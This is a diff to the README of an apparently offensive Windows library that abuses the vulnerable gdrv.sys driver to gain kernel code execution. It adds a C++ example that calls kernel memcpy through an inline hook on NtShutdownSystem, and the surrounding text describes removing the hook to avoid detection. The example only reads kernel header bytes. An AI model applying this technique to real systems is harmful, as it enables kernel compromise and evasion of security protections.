@@ -10,6 +10,31 @@ A library to manipulate drivers exposing a physical memory read/write primitive 
 memory read/write, a bunch are listed in this repo. Currently the project is using gdrv.sys, and is inline hooking NtShutdownSystem. The inline hook is not patchguard friendly,
 but is removed after every syscall into NtShutdownSystem to prevent possible detection.
 
+# Example
+
+In this example VDM syscalls into an inline hook placed on NtShutdownSystem to call memcpy exported from ntoskrnl.exe.
+
+```cpp
+	vdm::vdm_ctx vdm;	
+	const auto ntoskrnl_base = 
+		reinterpret_cast<void*>(
+			util::get_module_base("ntoskrnl.exe"));
+
+	const auto ntoskrnl_memcpy = 
+		util::get_kernel_export("ntoskrnl.exe", "memcpy");
+
+	std::printf("[+] drv_handle -> 0x%x, drv_key -> %s\n", drv_handle, drv_key.c_str());
+	std::printf("[+] %s physical address -> 0x%p\n", vdm::syscall_hook.first, vdm::syscall_address.load());
+	std::printf("[+] ntoskrnl base address -> 0x%p\n", ntoskrnl_base);
+	std::printf("[+] ntoskrnl memcpy address -> 0x%p\n", ntoskrnl_memcpy);
+
+	short mz_bytes = 0;
+	vdm.syscall<decltype(&memcpy)>(ntoskrnl_memcpy, &mz_bytes, ntoskrnl_base, sizeof mz_bytes);
+	std::printf("[+] kernel MZ -> 0x%x\n", mz_bytes);
+```
+
+
+
 # Usage
 
 Currently the project is configured to use gdrv, but if you want to swap the driver out you must defined four functions. 
